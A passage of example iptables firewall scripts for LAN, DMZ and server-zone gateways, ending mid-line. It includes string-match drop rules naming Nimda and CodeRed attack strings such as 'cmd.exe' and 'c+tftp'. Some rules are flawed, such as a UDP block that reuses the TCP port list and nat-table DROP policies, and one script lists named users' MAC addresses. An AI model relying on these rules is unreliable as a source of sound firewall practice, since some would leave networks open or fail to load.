\"${GRAS}${JAUNE}Enabling Reverse Path Filtering:${NORMAL}\\t\\t\\t${VERT}OK${NORMAL}\\n\" for f in /proc/sys/net/ipv4/conf/*/rp_filter; do echo 1 \u003e $f done ################################################### ## CLEAR OLD RULES ## ################################################### echo -en \"${GRAS}${JAUNE}Clearing old rules:${NORMAL}\" ${IPTABLES} -t filter -F INPUT ${IPTABLES} -t filter -F OUTPUT ${IPTABLES} -t filter -F FORWARD ${IPTABLES} -t nat -F PREROUTING ${IPTABLES} -t nat -F OUTPUT ${IPTABLES} -t nat -F POSTROUTING ${IPTABLES} -t mangle -F PREROUTING ${IPTABLES} -t mangle -F OUTPUT echo -e \"\\t\\t\\t${VERT}OK${NORMAL}\" ################################################### ## RESET CHAINS ## ################################################### echo -en \"${GRAS}${JAUNE}Resetting chains:${NORMAL}\" ${IPTABLES} -t filter -Z ${IPTABLES} -t nat -Z ${IPTABLES} -t mangle -Z echo -e \"\\t\\t\\t\\t${VERT}OK${NORMAL}\" ################################################### ## SET DEFAULT POLICY ## ################################################### echo -en \"${GRAS}${JAUNE}Setting default policy:${NORMAL}\" ${IPTABLES} -t filter -P INPUT DROP ${IPTABLES} -t filter -P OUTPUT ACCEPT ${IPTABLES} -t filter -P FORWARD DROP echo -e \"\\t\\t${VERT}OK${NORMAL}\\n\" ################################################### ## KEYWORDS TO LOG ## ################################################### if [ \"${MOTS_CLES}\" != \"\" ] ;then echo -ne \"${GRAS}${JAUNE}Enabling keyword-based logging system:${NORMAL}\" for mot in ${MOTS_CLES} ;do ${IPTABLES} -A INPUT -m string --string \"${mot}\" -j LOG --log-level info --log-prefix \"${mot}: \" ${IPTABLES} -A FORWARD -m string --string \"${mot}\" -j LOG --log-level info --log-prefix \"${mot}: \" done echo -e \"\\t\\t${VERT}OK${NORMAL}\" fi ################################################### ## Block entry of certain addresses ## ## via the firewall for tcp and udp ## ################################################### if [ \"${IP_INTERDITES}\" != \"\" ] ;then echo -e \"${GRAS}${JAUNE}Blocking entry of certain addresses:${NORMAL}\\t\\t${VERT}OK${NORMAL}\" for adr in ${IP_INTERDITES} ;do ${IPTABLES} -t filter -A FORWARD -p tcp -s ${adr} -j DROP ${IPTABLES} -t filter -A FORWARD -p udp -s ${adr} -j DROP done fi ################################################### ## Block outgoing of certain ports via ## ## the firewall for tcp ## ################################################### if [ \"${PORTS_TCP_SORTIE_REFUSES}\" != \"\" ] ;then echo -e \"${GRAS}${JAUNE}Blocking outgoing TCP ports:${NORMAL}\\t\\t${VERT}OK${NORMAL}\" for port_no in ${PORTS_TCP_SORTIE_REFUSES} ;do ${IPTABLES} -t filter -A FORWARD -p tcp --dport ${port_no} -j DROP ${IPTABLES} -t filter -A OUTPUT -p tcp -o ${INTERNET} --dport ${port_no} -j DROP done fi ################################################### ## Block outgoing of certain ports via ## ## the firewall for udp ## ################################################### if [ \"${PORTS_TCP_SORTIE_REFUSES}\" != \"\" ] ;then echo -e \"${GRAS}${JAUNE}Blocking outgoing UDP ports:${NORMAL}\\t\\t${VERT}OK${NORMAL}\" for port_no in ${PORTS_TCP_SORTIE_REFUSES} ;do ${IPTABLES} -t filter -A FORWARD -p udp --dport ${port_no} -j DROP ${IPTABLES} -t filter -A OUTPUT -p udp -o ${INTERNET} --dport ${port_no} -j DROP done fi ################################################### ## Block passage of certain keywords ## ################################################### if [ \"${MOTS_CLES_INTERDITS}\" != \"\" ] ;then echo -e \"${GRAS}${JAUNE}Blocking passage of certain keywords:${NORMAL}\\t\\t${VERT}OK${NORMAL}\" for mot_cles in ${MOTS_CLES_INTERDITS} ;do mot=`echo ${mot_cles} | sed 's/\u003e.*//g'` ip=`echo ${mot_cles} | sed 's/.*\u003e//g'` ${IPTABLES} -A INPUT -m string --string \"${mot}\" -d ${ip} -j DROP ${IPTABLES} -A FORWARD -m string --string \"${mot}\" -d ${ip} -j DROP done fi ################################################### ## Allow ICMP packets ## ################################################### if [ \"${PAQUETS_ICMP_AUTHORISES}\" != \"\" ] ;then echo -e \"${GRAS}${JAUNE}Allowing certain ICMP packets:${NORMAL}\\t\\t${VERT}OK${NORMAL}\" for icmp_no in ${PAQUETS_ICMP_AUTHORISES} ;do ${IPTABLES} -t filter -A INPUT -p icmp --icmp-type ${icmp_no} -m limit --limit ${PING_FLOOD} -j ACCEPT ${IPTABLES} -t filter -A FORWARD -p icmp --icmp-type ${icmp_no} -m limit --limit ${PING_FLOOD} -j ACCEPT ${IPTABLES} -t filter -A OUTPUT -p icmp --icmp-type ${icmp_no} -m limit --limit ${PING_FLOOD} -j ACCEPT done fi ################################################### ## Allow certain protocols to pass ## ################################################### if [ \"${PROTOCOLES_AUTHORISES}\" != \"\" ] ;then echo -e \"${GRAS}${JAUNE}Allowing certain protocols:${NORMAL}\\t\\t\\t${VERT}OK${NORMAL}\" for protocole_no in ${PROTOCOLES_AUTHORISES} ;do ${IPTABLES} -t filter -A INPUT -p ${protocole_no} -j ACCEPT ${IPTABLES} -t filter -A FORWARD -p ${protocole_no} -j ACCEPT done fi ################################################### ## Allow connections already established before ## ## launch of this script ## ################################################### echo -e \"${GRAS}${JAUNE}Allowing already established connections:${NORMAL}\\t\\t${VERT}OK${NORMAL}\" ${IPTABLES} -t filter -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT ${IPTABLES} -t filter -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT ${IPTABLES} -t filter -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT ################################################### ## Allow LocalHost connections ## ################################################### echo -e \"${GRAS}${JAUNE}Allowing localhost connections:${NORMAL}\\t${VERT}OK${NORMAL}\" ${IPTABLES} -t filter -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT ${IPTABLES} -t filter -A FORWARD -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT ${IPTABLES} -t filter -A OUTPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT ################################################### ## Allow TCP connections on the ## ## internet device ## ################################################### if [ \"${INTERNET}\" != \"\" ] ;then for internet_device in ${INTERNET} ;do if [ \"${PORTS_TCP_INTERNET_AUTHORISES}\" != \"\" ] ;then echo -e \"${GRAS}${JAUNE}TCP connections on internet interface ${internet_device}:${NORMAL}\\t\\t${VERT}OK${NORMAL}\" for port_no in ${PORTS_TCP_INTERNET_AUTHORISES} ;do ${IPTABLES} -t filter -A INPUT -p tcp -i ${internet_device} --dport ${port_no} -j ACCEPT if [ \"0${port_no}\" == \"021\" ] ;then ${IPTABLES} -t filter -A INPUT -p tcp -i ${internet_device} --sport 20 --dport 1024:65535 ! --syn -j ACCEPT fi done fi done fi ################################################### ## Allow UDP connections on the ## ## internet device ## ################################################### if [ \"${INTERNET}\" != \"\" ] ;then for internet_device in ${INTERNET} ;do if [ \"${PORTS_UDP_INTERNET_AUTHORISES}\" != \"\" ] ;then echo -e \"${GRAS}${JAUNE}UDP connections on internet interface ${internet_device}:${NORMAL}\\t\\t${VERT}OK${NORMAL}\" for port_no in ${PORTS_UDP_INTERNET_AUTHORISES} ;do ${IPTABLES} -t filter -A INPUT -p udp -i ${internet_device} --dport ${port_no} -j ACCEPT done fi done fi ################################################### ## Allow TCP connections on the ## ## DMZ device ## ################################################### if [ \"${DMZ}\" != \"\" ] ;then for dmz_device in ${DMZ} ;do if [ \"${PORTS_TCP_DMZ_AUTHORISES}\" != \"\" ] ;then echo -e \"${GRAS}${JAUNE}TCP connections on DMZ interface ${dmz_device}:${NORMAL}\\t\\t${VERT}OK${NORMAL}\" for port_no in ${PORTS_TCP_DMZ_AUTHORISES} ;do ${IPTABLES} -t filter -A INPUT -p tcp -i ${dmz_device} --dport ${port_no} -j ACCEPT if [ \"0${port_no}\" == \"021\" ] ;then ${IPTABLES} -t filter -A INPUT -p tcp -i ${dmz_device} --sport 20 --dport 1024:65535 ! --syn -j ACCEPT fi done fi done fi ################################################### ## Allow UDP connections on the ## ## DMZ device ## ################################################### if [ \"${DMZ}\" != \"\" ] ;then for dmz_device in ${DMZ} ;do if [ \"${PORTS_UDP_DMZ_AUTHORISES}\" != \"\" ] ;then echo -e \"${GRAS}${JAUNE}UDP connections on DMZ interface ${dmz_device}:${NORMAL}\\t\\t${VERT}OK${NORMAL}\" for port_no in ${PORTS_UDP_DMZ_AUTHORISES} ;do ${IPTABLES} -t filter -A INPUT -p udp -i ${dmz_device} --dport ${port_no} -j ACCEPT done fi done fi ################################################### ## Allow TCP connections on the ## ## server zone device ## ################################################### if [ \"${ZONE_SERVEURS}\" != \"\" ] ;then for zone_serveurs_device in ${ZONE_SERVEURS} ;do if [ \"${PORTS_TCP_ZONE_SERVEURS_AUTHORISES}\" != \"\" ] ;then echo -e \"${GRAS}${JAUNE}TCP connections on server zone interface ${zone_serveurs_device}:${NORMAL}\\t${VERT}OK${NORMAL}\" for port_no in ${PORTS_TCP_ZONE_SERVEURS_AUTHORISES} ;do ${IPTABLES} -t filter -A INPUT -p tcp -i ${zone_serveurs_device} --dport ${port_no} -j ACCEPT if [ \"0${port_no}\" == \"021\" ] ;then ${IPTABLES} -t filter -A INPUT -p tcp -i ${zone_serveurs_device} --sport 20 --dport 1024:65535 ! --syn -j ACCEPT fi done fi done fi ################################################### ## Allow UDP connections on the ## ## server zone device ## ################################################### if [ \"${ZONE_SERVEURS}\" != \"\" ] ;then for zone_serveurs_device in ${ZONE_SERVEURS} ;do if [ \"${PORTS_UDP_ZONE_SERVEURS_AUTHORISES}\" != \"\" ] ;then echo -e \"${GRAS}${JAUNE}UDP connections on server zone interface ${zone_serveurs_device}:${NORMAL}\\t${VERT}OK${NORMAL}\" for port_no in ${PORTS_UDP_ZONE_SERVEURS_AUTHORISES} ;do ${IPTABLES} -t filter -A INPUT -p udp -i ${zone_serveurs_device} --dport ${port_no} -j ACCEPT done fi done fi ################################################### ## Allow TCP connections on the ## ## LAN device ## ################################################### if [ \"${LAN}\" != \"\" ] ;then for lan_device in ${LAN} ;do if [ \"${PORTS_TCP_LAN_AUTHORISES}\" != \"\" ] ;then echo -e \"${GRAS}${JAUNE}TCP connections on LAN interface ${lan_device}:${NORMAL}\\t\\t${VERT}OK${NORMAL}\" for port_no in ${PORTS_TCP_LAN_AUTHORISES} ;do ${IPTABLES} -t filter -A INPUT -p tcp -i ${lan_device} --dport ${port_no} -j ACCEPT if [ \"0${port_no}\" == \"021\" ] ;then ${IPTABLES} -t filter -A INPUT -p tcp -i ${lan_device} --sport 20 --dport 1024:65535 ! --syn -j ACCEPT fi done fi done fi ################################################### ## Allow UDP connections on the ## ## LAN device ## ################################################### if [ \"${LAN}\" != \"\" ] ;then for lan_device in ${LAN} ;do if [ \"${PORTS_UDP_LAN_AUTHORISES}\" != \"\" ] ;then echo -e \"${GRAS}${JAUNE}UDP connections on LAN interface ${lan_device}:${NORMAL}\\t\\t${VERT}OK${NORMAL}\" for port_no in ${PORTS_UDP_LAN_AUTHORISES} ;do ${IPTABLES} -t filter -A INPUT -p udp -i ${lan_device} --dport ${port_no} -j ACCEPT done fi done fi echo -e \"\" ################################################### ## Masquerade the LAN ## ################################################### if [ \"${MASQ_LAN}\" = \"YES\" -o \"${MASQ_LAN}\" = \"yes\" ] ;then echo -e \"${GRAS}${JAUNE}Enabling Masquerading for the LAN:${NORMAL}\\t\\t${VERT}OK${NORMAL}\" for reseau in ${RESEAUX_LAN} ;do ${IPTABLES} -t nat -A POSTROUTING -s ${reseau} -o ${INTERNET} -j MASQUERADE ${IPTABLES} -t filter -A FORWARD -s ${reseau} -j ACCEPT done fi ################################################### ## Masquerade the DMZ ## ################################################### if [ \"${MASQ_DMZ}\" = \"YES\" -o \"${MASQ_DMZ}\" = \"yes\" ] ;then echo -e \"${GRAS}${JAUNE}Enabling Masquerading for the DMZ:${NORMAL}\\t\\t${VERT}OK${NORMAL}\" for reseau in ${RESEAUX_DMZ} ;do ${IPTABLES} -t nat -A POSTROUTING -s ${reseau} -o ${INTERNET} -j MASQUERADE ${IPTABLES} -t filter -A FORWARD -s ${reseau} -j ACCEPT done fi ################################################### ## Masquerade the server zone ## ################################################### if [ \"${MASQ_ZONE_SERVEURS}\" = \"YES\" -o \"${MASQ_ZONE_SERVEURS}\" = \"yes\" ] ;then echo -e \"${GRAS}${JAUNE}Enabling Masquerading for the server zone:${NORMAL}\\t${VERT}OK${NORMAL}\" for reseau in ${RESEAUX_ZONE_SERVEURS} ;do ${IPTABLES} -t nat -A POSTROUTING -s ${reseau} -o ${INTERNET} -j MASQUERADE ${IPTABLES} -t filter -A FORWARD -s ${reseau} -j ACCEPT done fi ################################################### ## Enable TCP NAT ## ################################################### if [ \"${NAT_TCP_NET}\" != \"\" ] ;then echo -e \"${GRAS}${JAUNE}Enabling TCP network address translation:${NORMAL}\\t\\t${VERT}OK${NORMAL}\" for translation in ${NAT_TCP_NET} ;do srcport=`echo ${translation} | sed 's/\u003e.*//g'|cut -d : -f 2` srchost=`echo ${translation} | sed 's/:.*//g'` desthost=`echo ${translation} | sed 's/.*\u003e//g'| cut -d : -f 1` destport=`echo ${translation} | sed 's/.*://g'` ${IPTABLES} -t nat -A PREROUTING -p tcp -i ${INTERNET_NAT} -d ${srchost} --dport ${srcport} -j DNAT --to ${desthost}:${destport} ${IPTABLES} -A FORWARD -p tcp -i ${INTERNET_NAT} -d ${desthost} --dport ${destport} -j ACCEPT done fi ################################################### ## Enable UDP NAT ## ################################################### if [ \"${NAT_UDP_NET}\" != \"\" ] ;then echo -e \"${GRAS}${JAUNE}Enabling UDP network address translation:${NORMAL}\\t\\t${VERT}OK${NORMAL}\" for translation in ${NAT_UDP_NET} ;do srcport=`echo ${translation} | sed 's/\u003e.*//g'|cut -d : -f 2` srchost=`echo ${translation} | sed 's/:.*//g'` desthost=`echo ${translation} | sed 's/.*\u003e//g'| cut -d : -f 1` destport=`echo ${translation} | sed 's/.*://g'` ${IPTABLES} -t nat -A PREROUTING -p udp -i ${INTERNET_NAT} -d ${srchost} --dport ${srcport} -j DNAT --to ${desthost}:${destport} ${IPTABLES} -A FORWARD -p udp -i ${INTERNET_NAT} -d ${desthost} --dport ${destport} -j ACCEPT done fi ################################################### ## FUCK nimda and codered:) ## ################################################### echo -e \"${GRAS}${JAUNE}Protection against Nimda and codered:${NORMAL}\\t\\t\\t${VERT}OK${NORMAL}\" ${IPTABLES} -I INPUT -j DROP -m string -p tcp -s 0.0.0.0/0 --string \"c+dir\" ${IPTABLES} -I INPUT -j DROP -m string -p tcp -s 0.0.0.0/0 --string \"c+tftp\" ${IPTABLES} -I INPUT -j DROP -m string -p tcp -s 0.0.0.0/0 --string \"cmd.exe\" ${IPTABLES} -I INPUT -j DROP -m string -p tcp -s 0.0.0.0/0 --string \"default.ida\" ${IPTABLES} -I FORWARD -j DROP -m string -p tcp -s 0.0.0.0/0 --string \"c+dir\" ${IPTABLES} -I FORWARD -j DROP -m string -p tcp -s 0.0.0.0/0 --string \"c+tftp\" ${IPTABLES} -I FORWARD -j DROP -m string -p tcp -s 0.0.0.0/0 --string \"cmd.exe\" ${IPTABLES} -I FORWARD -j DROP -m string -p tcp -s 0.0.0.0/0 --string \"default.ida\" ################################################### ## Enable logging ## ################################################### echo -ne \"${GRAS}${JAUNE}Enabling logging system:${NORMAL}\" ${IPTABLES} -t filter -A INPUT -p tcp -m limit --limit ${LOG_FLOOD} -j LOG --log-level info --log-prefix \"INPUT TCP DROPPED: \" ${IPTABLES} -t filter -A INPUT -p udp -m limit --limit ${LOG_FLOOD} -j LOG --log-level info --log-prefix \"INPUT UDP DROPPED: \" ${IPTABLES} -t filter -A INPUT -p icmp -m limit --limit ${LOG_FLOOD} -j LOG --log-level info --log-prefix \"INPUT ICMP DROPPED: \" ${IPTABLES} -t filter -A INPUT -f -m limit --limit ${LOG_FLOOD} -j LOG --log-level info --log-prefix \"INPUT FRAGMENT DROPPED: \" ${IPTABLES} -t filter -A INPUT -p all -m limit --limit ${LOG_FLOOD} -j LOG --log-level info --log-prefix \"INPUT PROTOCOL DROPPED: \" ${IPTABLES} -t filter -A FORWARD -p tcp -m limit --limit ${LOG_FLOOD} -j LOG --log-level info --log-prefix \"FORWARD TCP DROPPED: \" ${IPTABLES} -t filter -A FORWARD -p udp -m limit --limit ${LOG_FLOOD} -j LOG --log-level info --log-prefix \"FORWARD UDP DROPPED: \" ${IPTABLES} -t filter -A FORWARD -p icmp -m limit --limit ${LOG_FLOOD} -j LOG --log-level info --log-prefix \"FORWARD ICMP DROPPED: \" ${IPTABLES} -t filter -A FORWARD -f -m limit --limit ${LOG_FLOOD} -j LOG --log-level info --log-prefix \"FORWARD FRAGMENT DROPPED: \" ${IPTABLES} -t filter -A FORWARD -p all -m limit --limit ${LOG_FLOOD} -j LOG --log-level info --log-prefix \"FORWARD PROTOCOL DROPPED: \" echo -e \"\\t\\t\\t\\t${VERT}OK${NORMAL}\" Example 5 link #!/bin/bash #------------------------------------------------------------------------- # Essentials #------------------------------------------------------------------------- IPTABLES='/sbin/iptables'; modprobe nf_conntrack_ftp #------------------------------------------------------------------------- # Physical and virtual interfaces definitions #------------------------------------------------------------------------- # Interfaces wan_if=\"eth0\"; vpn_if=\"tap0\"; #------------------------------------------------------------------------- # Networks definitions #------------------------------------------------------------------------- # Networks wan_ip=\"x.x.x.x\"; lan_net=\"192.168.90.0/24\"; vpn_net=\"192.168.20.0/24\"; # IPs ed_ip=\"192.168.90.1\"; banzai_ip=\"192.168.90.2\"; #------------------------------------------------------------------------- # Global Rules input / output / forward #------------------------------------------------------------------------- # Flushing tables $IPTABLES -F $IPTABLES -X $IPTABLES -t nat -F # Define default policy $IPTABLES -P INPUT DROP $IPTABLES -P OUTPUT ACCEPT $IPTABLES -P FORWARD ACCEPT $IPTABLES -A INPUT -j ACCEPT -d $lan_net; $IPTABLES -A INPUT -j ACCEPT -m state --state ESTABLISHED,RELATED #------------------------------------------------------------------------- # Allow masquerading for VE #------------------------------------------------------------------------- # Activating masquerade to get Internet from VE $IPTABLES -t nat -A POSTROUTING -o $wan_if -s $lan_net -j MASQUERADE # Activating masquerade to get VPN access from VE $IPTABLES -t nat -A POSTROUTING -o tap0 -j MASQUERADE #------------------------------------------------------------------------- # Allow ports on CT #------------------------------------------------------------------------- # Allow ICMP $IPTABLES -A INPUT -j ACCEPT -p icmp # SSH access $IPTABLES -A INPUT -j ACCEPT -p tcp --dport 22 #------------------------------------------------------------------------- # Redirections for incoming connections (wan) #------------------------------------------------------------------------- # HTTP access $IPTABLES -t nat -A PREROUTING -p tcp --dport 80 -d $wan_ip -j DNAT --to-destination $ed_ip:80 # HTTPS access $IPTABLES -t nat -A PREROUTING -p tcp --dport 443 -d $wan_ip -j DNAT --to-destination $ed_ip:443 Example 6 link #!/bin/bash clear echo \"############################## Firewall Rules ###################################\" # Enable routing echo 1 \u003e /proc/sys/net/ipv4/ip_forward echo \"Initializing rules\" # Clear all rules iptables -F iptables -t nat -F # Apply basic policies # Allow internal traffic iptables -P INPUT ACCEPT iptables -P OUTPUT ACCEPT iptables -P FORWARD ACCEPT # Block all entry and exit iptables -t nat -P PREROUTING DROP iptables -t nat -P POSTROUTING DROP # Internal traffic allowed echo \"Internal traffic\" iptables -t nat -I POSTROUTING -o lo -j ACCEPT iptables -t nat -I PREROUTING -i lo -j ACCEPT # Network card definitions WEB=\"ppp0\" DMZ=\"eth2\" COM=\"eth1\" STA=\"eth0\" PPP=\"ppp0\" # IP network definitions NET_COM=\"10.0.0.0/8\" NET_STA=\"192.168.2.0/24\" NET_DMZ=\"172.16.1.0/24\" # Server definitions for external connection to servers REMOTE=\"192.168.2.8:81\" FICS=\"172.16.1.6/32\" EXC=\"172.16.1.3/32\" DC=\"172.16.1.1/32\" MAIL=\"172.16.1.3:25\" HTTP=\"172.16.1.4:80\" EMULE=\"172.16.1.4:5555\" RDP=\"172.16.1.4:3389\" PPTP=\"172.16.1.1\" VUE=\"192.168.2.8/32\" MAILWEB=\"172.16.1.3/32\" LINUX2=\"172.16.1.7/32\" LINUX=\"192.168.2.5/32\" YONI=\"192.168.2.62/32\" WIFI=\"192.168.2.7/32\" # Common Rules # ====================== \u003e\u003e\u003e\u003e Masquerade all networks to the internet echo \"Applying common rules\" # All outgoing traffic to Internet is masqueraded iptables -t nat -I POSTROUTING -s $NET_STA -d $NET_DMZ -j MASQUERADE # Squid must always go out to internal clients iptables -t nat -I POSTROUTING -p tcp --sport 3128 -d $NET_STA -j ACCEPT iptables -t nat -I POSTROUTING -o $WEB -j MASQUERADE iptables -t nat -I POSTROUTING -o $COM -j MASQUERADE iptables -t nat -A POSTROUTING -s $NET_STA -o $COM -j DROP iptables -t nat -A POSTROUTING -s $NET_DMZ -o $COM -j DROP iptables -I INPUT -i $WEB -m state --state ESTABLISHED -j ACCEPT iptables -I OUTPUT -m state --state ESTABLISHED -j ACCEPT iptables -I INPUT -i $COM -m state --state ESTABLISHED -j ACCEPT # Allow standard internal routing # ====================== \u003e\u003e\u003e\u003e DHCP echo \"Allowing DHCP traffic\" iptables -t nat -A PREROUTING -p udp --dport 67:68 -j ACCEPT iptables -t nat -A POSTROUTING -p udp --sport 67:68 -j ACCEPT echo \"Local DNS to SRV-DC\" iptables -t nat -A PREROUTING -p udp --sport 53 -i $DMZ -s \"172.16.1.1/32\" -j ACCEPT iptables -t nat -A POSTROUTING -p udp --dport 53 -o $DMZ -d \"172.16.1.1/32\" -j ACCEPT iptables -t nat -A PREROUTING -p tcp --sport 53 -i $DMZ -s \"172.16.1.1/32\" -j ACCEPT iptables -t nat -A POSTROUTING -p tcp --dport 53 -o $DMZ -d \"172.16.1.1/32\" -j ACCEPT # Network access rules # 1 --\u003e DMZ echo \"====================== \u003e\u003e\u003e\u003e Rules for commercial machines\" echo \"Daytime rules\" echo \"Access based on time\" iptables -t nat -I PREROUTING -i $DMZ -m time --timestart 08:45 --timestop 17:45 \\ --days Mon,Tue,Wed,Thu,Fri -p tcp -m multiport --ports 20,21,80,3128,1863,110,119,25,8080,9000 -j ACCEPT echo \"Nighttime rules\" iptables -t nat -I PREROUTING -i $DMZ -m time --timestart 17:46 --timestop 23:59 \\ --days Mon,Tue,Wed,Thu -p tcp -j ACCEPT iptables -t nat -I PREROUTING -i $DMZ -m time --timestart 00:00 --timestop 08:44 \\ --days Mon,Tue,Wed,Thu,Fri -p tcp -j ACCEPT # No limits on weekends echo \"No limits on weekends\" iptables -t nat -I PREROUTING -i $DMZ -m time --timestart 17:46 --timestop 23:59 \\ --days Fri -p tcp -j ACCEPT iptables -t nat -I PREROUTING -i $DMZ -m time --timestart 00:00 --timestop 23:59 \\ --days Sat,Sun -p tcp -j ACCEPT iptables -t nat -I PREROUTING -i $DMZ -p udp --dport 53 -j ACCEPT #====\u003e\u003e\u003e\u003e\u003e Transparent proxy for commercial users iptables -t nat -I PREROUTING -p tcp -i $DMZ --dport 80 -j REDIRECT --to-port 3128 iptables -t nat -A PREROUTING -p tcp -i $DMZ --dport 443 -j ACCEPT #\tiptables -t nat -A PREROUTING -p tcp -i $DMZ --dport 443 -j REDIRECT --to-port 3128 echo \"====================== \u003e\u003e\u003e\u003e Rules for classrooms\" # 2 --\u003e Classroom \u003c-\u003e DMZ #\tA - FICS2 echo \"\tClassroom -\u003e SRV-FICS2\" iptables -t nat -A PREROUTING -p tcp -d $FICS -j ACCEPT iptables -t nat -A PREROUTING -p tcp --dport 80 -d $MAILWEB -j ACCEPT iptables -t nat -A POSTROUTING -s $NET_DMZ -d $NET_STA -j ACCEPT # 3 --\u003e Classroom \u003c-\u003e Internet #\tA - HTTP echo \"\tClassroom -\u003e Internet with Squid\" iptables -t nat -A PREROUTING -p tcp -i $STA --dport 80 -j REDIRECT --to-port 3128 iptables -t nat -A PREROUTING -p tcp -i $STA --dport 443 -j ACCEPT #\tC - DNS iptables -t nat -A PREROUTING -p udp -i $STA --dport 53 -j ACCEPT #\tiptables -t nat -A PREROUTING -p tcp -i $STA --dport 53 -j ACCEPT echo \"====================== \u003e\u003e\u003e\u003e Rules for Internet to internal network\" # 5 --\u003e Internet \u003c--\u003e DMZ #\tA - SMTP echo \"\tSMTP\" iptables -t nat -I PREROUTING -i $WEB -p tcp --dport 25 -j DNAT --to-destination $MAIL iptables -t nat -I POSTROUTING -o $DMZ -d $EXC -p tcp --dport 25 -j ACCEPT #\tB - WEB echo \"\tWEB\" iptables -t nat -A PREROUTING -i $WEB -p tcp --dport 80 -j DNAT --to-destination $HTTP iptables -t nat -A POSTROUTING -o $DMZ -d \"172.16.1.4/32\" -p tcp --dport 80 -j MASQUERADE #\tB' - EMULE iptables -t nat -A PREROUTING -i $WEB -p tcp --dport 5555 -j DNAT --to-destination $EMULE iptables -t nat -A POSTROUTING -o $DMZ -d \"172.16.1.4/32\" -p tcp --dport 5555 -j MASQUERADE iptables -t nat -A PREROUTING -i $WEB -p udp --dport 5555 -j DNAT --to-destination $HTTP iptables -t nat -A POSTROUTING -o $DMZ -d \"172.16.1.4/32\" -p udp --dport 5555 -j MASQUERADE #\tC - PPTP echo \"\tPPTP\" iptables -t nat -A PREROUTING -i $WEB -p 47 -j DNAT --to-destination $PPTP iptables -t nat -A POSTROUTING -o $DMZ -p 47 -j MASQUERADE iptables -t nat -A PREROUTING -i $WEB -p tcp --dport 1723 -j DNAT --to-destination $PPTP iptables -t nat -A POSTROUTING -o $DMZ -p tcp --dport 1723 -j MASQUERADE #\tD - SSH from outside or only for authorized internal machines echo \"\tSSH from Internet\" iptables -t nat -A PREROUTING -s 172.16.1.0/24 -p tcp --dport 22 -j ACCEPT # E - FTP echo \" FTP IS DISABLED!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\" #iptables -t nat -A PREROUTING -i $WEB -p tcp --dport 20 -j DNAT --to-destination \"172.16.1.4:20\" #iptables -t nat -A PREROUTING -i $WEB -p tcp --dport 21 -j DNAT --to-destination \"172.16.1.4:21\" #iptables -t nat -A POSTROUTING -o $DMZ -d \"172.16.1.4/32\" -p tcp --dport 21 -j MASQUERADE #iptables -t nat -A POSTROUTING -o $DMZ -d \"172.16.1.4/32\" -p tcp --dport 20 -j MASQUERADE #\tF - RDP echo \" RDP\" iptables -t nat -A PREROUTING -i $WEB -p tcp --dport 3389 -j DNAT --to-destination $RDP iptables -t nat -A POSTROUTING -o $DMZ -d \"172.16.1.4/32\" -p tcp --dport 3389 -j MASQUERADE #\tG - SNMP echo \" SNMP\" iptables -t nat -A POSTROUTING -p tcp --dport 161 -j ACCEPT iptables -t nat -A POSTROUTING -p udp --dport 161 -j ACCEPT iptables -t nat -A POSTROUTING -p udp --dport 162 -j ACCEPT # 6 --\u003e Access by MAC address echo \"====================== \u003e\u003e\u003e\u003e Special rules for internal users\" echo \"\tYoni\" #\tA - Yoni iptables -t nat -I PREROUTING -m mac --mac-source '00:00:F0:82:58:AF' -j ACCEPT iptables -t nat -I PREROUTING -m mac --mac-source '00:04:23:76:63:10' -j ACCEPT #\tA' - OlivierG iptables -t nat -I PREROUTING -s 192.168.2.69/32 -m mac --mac-source '00:0d:60:75:b8:75' -j ACCEPT iptables -t nat -I PREROUTING -s 192.168.2.39/32 -m mac --mac-source '00:0C:F1:43:14:05' -j ACCEPT #\tB - Olivier all echo \"\tOlivierC\" iptables -t nat -I PREROUTING -s 192.168.2.63/32 -m mac --mac-source '00:90:F5:1E:51:A1' -j ACCEPT iptables -t nat -I PREROUTING -s 172.16.1.63/32 -m mac --mac-source '00:90:F5:1E:51:A1' -j ACCEPT # Wifi Olivier iptables -t nat -I PREROUTING -m mac --mac-source '00:A0:C5:B1:DD:15' -j ACCEPT #\tC - Steeve all echo \"\tSteeve\" iptables -t nat -I PREROUTING -s 192.168.2.64/32 -m mac --mac-source '00:08:02:04:fa:d7' -j ACCEPT iptables -t nat -I PREROUTING -m mac --mac-source '00:08:02:04:fa:d7' -j ACCEPT #\tD - Portable Compaq echo \"\tPortable Compaq\" iptables -t nat -I PREROUTING -s 192.168.2.65/32 -m mac --mac-source '00:50:8B:FA:B9:5B' \\ -p tcp -m multiport --ports 443,110,25,119 -j ACCEPT iptables -t nat -I PREROUTING -s 192.168.2.65/32 -m mac --mac-source '00:50:8B:FA:B9:5B' \\ -p udp --dport 53 -j ACCEPT iptables -t nat -I PREROUTING -s 192.168.2.65/32 -m mac --mac-source '00:50:8B:FA:B9:5B' \\ -d $NET_DMZ -j ACCEPT #\tD' Portable Toshiba echo \"\tPortable Toshiba\" iptables -t nat -I PREROUTING -s 192.168.2.67/32 -m mac --mac-source '00:01:02:E7:36:E3' \\ -p tcp -m multiport --ports 443,110,25,119 -j ACCEPT iptables -t nat -I PREROUTING -s 192.168.2.67/32 -m mac --mac-source '00:01:02:E7:36:E3' \\ -p udp --dport 53 -j ACCEPT iptables -t nat -I PREROUTING -s 192.168.2.67/32 -m mac --mac-source '00:01:02:E7:36:E3' \\ -d $NET_DMZ -j ACCEPT #\tE - VUE Server echo \"\tVUE Server\" iptables -t nat -I PREROUTING -s $VUE -m mac --mac-source '00:0c:6e:c5:42:6c' -j ACCEPT iptables -t nat -I PREROUTING -i $DMZ -d $VUE -j ACCEPT #\tF- Linux Server Ground Floor echo \" Linux Server\" iptables -t nat -I PREROUTING -i $DMZ -d $LINUX -j ACCEPT #\tF - Quentin Laptop echo \" Quentin\" iptables -t nat -I PREROUTING -s 172.16.1.65/32 -m mac --mac-source '00:0b:db:a1:c2:a5' -j ACCEPT iptables -t nat -I PREROUTING -s 192.168.2.65/32 -m mac --mac-source '00:0b:db:a1:c2:a5' -j ACCEPT iptables -t nat -I PREROUTING -s 192.168.2.65/32 -m mac --mac-source '00:a0:c5:b1:da:f8' -j ACCEPT #\tF - Eva Laptop echo \" Eva is grounded\" #iptables -t nat -I PREROUTING -m 